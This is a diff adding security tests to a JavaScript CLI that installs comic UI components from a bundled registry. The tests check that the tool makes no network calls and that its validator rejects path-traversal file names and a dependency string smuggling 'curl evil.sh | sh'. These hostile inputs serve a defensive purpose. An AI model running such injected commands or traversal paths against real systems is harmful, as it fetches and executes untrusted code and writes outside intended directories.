@@ -65,4 +65,43 @@ describe("c-comic CLI", () => {
   it("lists every registry component", async () => {
     expect(await cli.main(["list"], cwd)).toBe(0);
   });
+
+  it("never fetches the registry over the network", () => {
+    const source = fs.readFileSync(path.join(root, "bin", "c-comic.js"), "utf8");
+    expect(source).not.toMatch(/fetch\(|https?:\/\//);
+    expect(source).not.toMatch(/execSync/);
+  });
+
+  it("rejects registry entries that would write outside components/comic-ui", () => {
+    expect(() =>
+      cli.validateEntry("evil", {
+        name: "evil",
+        files: [{ name: "../../../etc/profile.d/evil.ts", content: "" }],
+      }),
+    ).toThrow(/unsafe file name/);
+    expect(() =>
+      cli.validateEntry("evil", { name: "evil", files: [{ name: "run.sh", content: "" }] }),
+    ).toThrow(/unsafe file name/);
+  });
+
+  it("rejects registry dependencies that are not plain package names", () => {
+    expect(() =>
+      cli.validateEntry("evil", {
+        name: "evil",
+        files: [{ name: "evil.tsx", content: "" }],
+        dependencies: ["clsx; curl evil.sh | sh"],
+      }),
+    ).toThrow(/unsafe dependency name/);
+    expect(() =>
+      cli.validateEntry("evil", {
+        name: "evil",
+        files: [{ name: "evil.tsx", content: "" }],
+        registryDependencies: ["../button"],
+      }),
+    ).toThrow(/unsafe component dependency/);
+  });
+
+  it("accepts every entry in the bundled registry", async () => {
+    await expect(cli.loadRegistry()).resolves.toBeTypeOf("object");
+  });
 });
